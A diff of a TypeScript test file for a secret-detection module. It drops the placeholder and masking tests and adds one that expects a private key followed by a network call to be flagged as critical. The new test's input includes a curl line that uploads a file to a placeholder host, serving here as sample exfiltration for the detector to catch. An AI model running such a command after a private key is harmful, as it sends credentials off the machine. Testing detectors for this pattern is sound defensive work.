@@ -1,5 +1,5 @@
 import { expect, test } from "bun:test";
-import { embeddedSecrets, isPlaceholder, maskSecrets } from "./embedded-secret.ts";
+import { embeddedSecrets } from "./embedded-secret.ts";
 import { AWS_KEY, GITHUB_TOKEN, KEY_BODY, PRIVATE_KEY } from "./test-secrets.ts";
 
 test("a network call more than five lines away leaves the secret at warn", () => {
@@ -21,16 +21,11 @@ test("a private key body shorter than 64 characters is not a key", () => {
   expect(embeddedSecrets(short, [])).toBeUndefined();
 });
 
-test("placeholders are variables, templates, and filler words", () => {
-  for (const value of ["$TOKEN", "${API_KEY}", "<token>", "{{ token }}", "%TOKEN%", "your-key"]) {
-    expect(isPlaceholder(value)).toBe(true);
-  }
-  expect(isPlaceholder("S3cr3tPassw0rd")).toBe(false);
-});
-
-test("tokens and key bodies in any detail are masked", () => {
-  expect(maskSecrets(`export GH=${GITHUB_TOKEN}`)).toBe("export GH=ghp_…4kVo");
-  expect(maskSecrets(PRIVATE_KEY.replaceAll("\n", " "))).toBe(
-    "-----BEGIN OPENSSH PRIVATE KEY----- ********-----END OPENSSH PRIVATE KEY-----",
-  );
+test("a send after a private key's END line counts from that line", () => {
+  const key = PRIVATE_KEY.replace(KEY_BODY, Array(12).fill(KEY_BODY).join("\n"));
+  expect(embeddedSecrets(`${key}\ncurl -T k https://x.invalid\n`, [15])).toEqual({
+    severity: "critical",
+    line: 1,
+    detail: "OPENSSH PRIVATE KEY block (14 lines) (network call on line 15)",
+  });
 });
